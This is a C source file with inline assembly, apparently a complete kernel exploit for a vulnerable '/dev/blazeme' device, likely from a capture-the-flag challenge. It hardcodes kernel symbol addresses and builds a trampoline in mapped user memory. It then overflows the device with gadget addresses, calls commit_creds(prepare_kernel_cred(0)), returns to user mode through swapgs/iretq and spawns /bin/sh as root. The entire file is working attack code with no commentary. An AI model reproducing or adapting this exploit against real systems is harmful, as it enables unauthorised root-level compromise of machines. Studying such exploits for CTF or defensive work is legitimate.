void *(*prepare_kernel_cred)(void *) = 0xffffffff81063b50;
void (*commit_creds)(void *) = 0xffffffff81063960;

int read(int fd, void *buf, unsigned long count) {
    __asm__("mov rax, 0");
    __asm__("syscall");
}

int write(int fd, const void *buf, unsigned long count) {
    __asm__("mov rax, 1");
    __asm__("syscall");
}

int open(const char *pathname, int flags) {
    __asm__("mov rax, 2");
    __asm__("syscall");
}

void *mmap(void *addr, unsigned long length, int prot, int flags, int fd, unsigned long offset) {
    __asm__("mov r10, rcx");
    __asm__("mov rax, 9");
    __asm__("syscall");
}

int execve(const char *filename, char *const args[], char *const envp[]) {
    __asm__("mov rax, 59");
    __asm__("syscall");
}

void run_shell(void) {
    char *args[2] = {"/bin/sh"};
    execve(args[0], args, 0);
}

struct {
    void *rip;
    unsigned long cs;
    unsigned long rflags;
    void *rsp;
    unsigned long ss;
} frame;

void save_frame(void) {
    __asm__("mov %q0, cs" : "=r" (frame.cs));
    __asm__("mov %q0, ss" : "=r" (frame.ss));
    __asm__("mov %q0, rsp" : "=r" (frame.rsp));
    __asm__("pushfq");
    __asm__("pop %q0" : "=r" (frame.rflags));
    frame.rip = run_shell;
}

void escalate_and_restore(void) {
    commit_creds(prepare_kernel_cred(0));
    __asm__("swapgs");
    __asm__("mov rsp, %q0" :: "r" (&frame));
    __asm__("iretq");
}

void _start(void) {
    save_frame();
    char *buf = mmap(0x5d000000, 0x1000, 7, 0x22, -1, 0);
    // mov rax, $escalate_and_restore
    buf[2] = 0x48;
    buf[3] = 0xb8;
    *((unsigned long *)&buf[4]) = escalate_and_restore;
    // push rax
    buf[12] = 0x50;
    // ret
    buf[13] = 0xc3;

    unsigned long payload[8];
    for (int i = 0; i < 8; i++) {
        // 0xffffffff8143671f: push 0x5D000002 ; ret
        payload[i] = 0xffff8143671fffff;
    }

    int fd = open("/dev/blazeme", 2);
    while (1) {
        write(fd, (char *)payload, 64);
    }
}
